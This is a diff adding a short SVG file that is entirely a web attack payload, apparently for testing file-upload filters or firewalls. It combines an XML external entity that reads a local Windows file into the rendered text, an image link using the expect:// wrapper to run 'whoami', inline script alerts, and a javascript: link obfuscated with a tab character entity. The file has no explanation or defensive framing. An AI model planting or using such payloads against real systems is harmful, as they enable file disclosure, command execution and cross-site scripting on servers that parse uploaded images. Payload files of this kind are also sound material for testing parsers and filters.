@@ -1,0 +1,14 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/CyberSec/Payloads/WAF.txt" > ]>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script>
+      alert("hacked");
+   </script>
+   <image xlink:href="expect://whoami" width="200" height="200"></image>
+   <text font-size="16" x="0" y="16">&xxe;</text>
+   <a href="javascript&#9;:alert(1)" onload="alert(2)">
+    <circle cx="50" cy="50" r="25"/>
+  </a>
+  
+</svg>
